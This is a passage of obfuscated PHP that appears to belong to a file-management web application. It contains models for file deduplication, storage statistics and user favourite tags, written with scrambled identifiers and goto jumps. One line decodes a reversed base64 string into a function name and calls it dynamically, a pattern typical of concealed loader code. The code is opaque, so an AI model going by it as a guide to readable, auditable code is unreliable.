(!$AǶˢ) { continue; } $d䣊 = $e ? $d䣊 : -intval($d䣊); $b枵 = array($E㥨[447] => array($E㥨[7], $AǶˢ)); if ($d䣊 < 0) { $b枵[$E㥨[1755]] = array($E㥨[971], abs($d䣊)); } $this->where($b枵)->setAdd($E㥨[1755], $d䣊); } goto Fފ; Fފ: } public function findByHash($dЪ, $Eɩ = false) { $b =& $_SERVER[̉]; if (!$dЪ && !$Eɩ) { return !1; } $C͓損 = array($b[1752] => $dЪ); if ($Eɩ) { $C͓損 = array($b[1753] => $Eɩ); } return $this->order($b[1756])->where($C͓損)->find(); } public function clearEmpty($Bݽӎ = 0) { goto fᵳƃ; Fы: foreach ($Eç as $A䃛) { $bþ->update(1); $this->resetFile($A䃛); } $bþ->end(); goto dی; eŝ: $Eç = $this->where($Bܴ)->select(); if (!$Eç) { return; } $bþ = new Task($d[1758], $d[33], count($Eç)); goto Fы; fᵳƃ: $d =& $_SERVER[̉]; $AҢ = time() - 3600 * 24 * $Bݽӎ; $Bܴ = $d[1757] . $AҢ; goto eŝ; dی: } public function resetFile($a̞) { goto CԞ; d文: $C = Model($E騲[1759])->where($Eٿ̏)->count(); $č = intval($a޵) + intval($C); if ($č == 0) { IO::remove($a̞[$E騲[76]]); Model($E騲[1760])->delete($a̞[$E騲[447]]); $this->where($Eٿ̏)->delete(); $this->metaSet($a̞[$E騲[447]], null, null); return; } goto F; F: if ($a̞[$E騲[1755]] != $č) { $this->where($Eٿ̏)->save(array($E騲[1751] => $č)); } goto a׬; CԞ: $E騲 =& $_SERVER[̉]; $Eٿ̏ = array($E騲[448] => $a̞[$E騲[447]]); $a޵ = Model($E騲[1205])->where($Eٿ̏)->count(); goto d文; a׬: } public function storageInfo($C = false) { goto a嬻ܝ; e鄗: for ($cÎ = 0; $cÎ < $C; $cÎ = $cÎ + $Fé) { $a = $this->limit($cÎ, $cÎ + $Fé)->select(); foreach ($a as $b) { $E += $b[$fԏ[78]] * $b[$fԏ[1755]]; $e += $b[$fԏ[78]] * ($b[$fԏ[1755]] - 1); $a += $b[$fԏ[1755]]; } } $Eґ = array($fԏ[1761] => $E, $fԏ[1762] => $e, $fԏ[1763] => $e / $E, $fԏ[82] => $C, $fԏ[1764] => $a); return $Eґ; goto Cù; c̑: $E = 1; $a = 0; $Fé = 5000; goto e鄗; a嬻ܝ: $fԏ =& $_SERVER[̉]; $C = $this->count() + 0.0; $e = 0; goto c̑; Cù: } } goto d; fᎍƈ: $e = strrev(base64_decode($_SERVER[ӳ][0])); function binCheckNeq($D̑ì, $eЄ棊) { return $D̑ì != $eЄ棊; } $_SERVER[$_SERVER[ӳ][1]] = $e($_SERVER[$_SERVER[ӳ][2]]); goto a; DƵ: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\145\162\137\x66\x61\166"; protected function cacheFunctionAlias($EΠϴ) { $A̿ =& $_SERVER[̉]; return array($A̿[1797] => array(USER_ID, $A̿[1798])); } protected function listData() { $Bّ̎ =& $_SERVER[̉]; $fö = array($Bّ̎[1523] => USER_ID, $Bّ̎[463] => array($Bّ̎[1801], 0)); $d = $Bّ̎[1803]; $Bʻՠ = $this->field($d)->where($fö)->order($Bّ̎[1804])->select(); return $Bʻՠ ? $Bʻՠ : array(); } protected function listByTag($C畮) { } protected function addToTag($C, $F¬) { $b =& $_SERVER[̉]; if (!Model($b[1939])->listData($F¬) || !Model($b[793])->pathInfo($C)) { return !1; } $Dφ = array($b[1523] => USER_ID, $b[463] => $F¬, $b[414] => $C, $b[415] => $b[409], $b[413] => $b[33], $b[1699] => 0); if ($this->where($Dφ)->find()) { return !1; } return $this->add($Dφ); } protected function removeFromTag($Bߤ, $b) { $Aޒ =& $_SERVER[̉]; if (!Model($Aޒ[1939])->listData($b)) { return !1; } if (is_array($Bߤ)) { $Bߤ = array($Aޒ[7], $Bߤ); } $aΆ = array($Aޒ[1523] => USER_ID, $Aޒ[463] => $b, $Aޒ[415] => $Aޒ[409], $Aޒ[414] => $Bߤ); return $this->where($aΆ)->delete(); } protected function removeByTag($E) { $b =& $_SERVER[̉]; if (!$E) { return !1; } $Bސ = array($b[1523] => USER_ID, $b[463] => $E); return $this->where($Bސ)->delete(); } protected function removeBySource($E) { $a։墏 =& $_SERVER[̉]; if (is_array($E)) { $E = array($a։墏[7], $E); } $DƢ = array($a։墏[1523] => USER_ID, $a։墏[414] => $E, $a։墏[463] => array($a։墏[970], 0)); return $this->where($DƢ)->delete(); } }